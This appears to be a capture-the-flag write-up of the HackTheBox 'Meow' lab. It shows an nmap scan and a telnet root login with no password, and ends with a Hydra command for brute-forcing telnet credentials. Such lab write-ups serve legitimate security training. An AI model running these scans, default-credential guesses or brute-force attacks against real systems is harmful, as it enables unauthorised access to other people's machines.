Hello Hackers,  

Meow is one of the Hackthebox's machine in the starting point category with the level of Very Easy. This machine introduces us to the Telnet protocol.

### Enumeration 
Nmap is a network mapper tool used to find open ports. To find open ports, run the below command.

```bash
$ nmap -Pn -A -T4 -vvv -oN scan_output.nmap <IP>
```
Explanation,

`nmap` Initiates nmap tool   
`-Pn` Treat all hosts as online   
`-A` Enable agressive mode (OS Detection + Version Detection + Scripting Scanning + traceroute)  
`-T4` Enable agressive speed  
`-vvv` Verbosity with level of three  
`-oN` Normal output to  a file "scan_output.nmap"  
`10.129.195.171` Target IP

```bash
$ nmap -Pn -A -T4 -vvv -oN scan_output.nmap 10.129.195.171
# Nmap 7.92 scan initiated Thu Apr  7 14:02:31 2022 as: nmap -Pn -A -T4 -vvv -oN nmap/all-ports 10.129.195.171
Nmap scan report for 10.129.195.171
Host is up, received user-set (0.37s latency).
Scanned at 2022-04-07 14:02:32 IST for 50s
Not shown: 999 closed tcp ports (conn-refused)
PORT   STATE SERVICE REASON  VERSION
23/tcp open  telnet  syn-ack Linux telnetd
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Apr  7 14:03:22 2022 -- 1 IP address (1 host up) scanned in 51.05 seconds
```

In the above scan result, we can see that TCP port number 23 is open. TCP port 23 is the reserved port for the TELNET protocol.

As per Wikipedia, Telnet is an application protocol used on the Internet or local area network to provide a bidirectional interactive text-oriented communication facility using a virtual terminal connection.

### Exploitation

Let's try to connect Telnet on port 23.

```bash
$ telnet 10.129.195.171 23
```
![telnet login](/assets/posts_assets/2022-04-07-Meow/2022-4-07-Meow-telnet-login.png)

We can see that it's asking for the TELNET login credentials. Since we don't have any login credentials, we can try the following common credentials,  

admin:admin  
administrator:administrator  
root:[no_password]

The first two login credentials were not working. However, username root with no password worked.

![telnet login success](/assets/posts_assets/2022-04-07-Meow/2022-4-07-Meow-telnet-login-success.png)

We can see the root flag is inside our home directory. To read,

```bash
root@Meow:~# cat flag.txt
```

### Bonus Tip
If you want to crack the telnet username and password then try Hydra. Hydra is the fastest password cracking tool.

Run below command to crack the telnet username and password.

```bash
$ hydra -L usernames.txt -P rockyou.txt 10.129.195.171 telnet -f -vV
```

Explanation,

`hydra` Initiates Hydra tool  
`-L` List of usernames "usernames.txt"  
`-P` List of passwords "rockyou.txt"  
`10.129.195.171` Target IP  
`telnet` Service that we want to crack password for  
`-f` Exit on successful login  
`-vV` Verbose
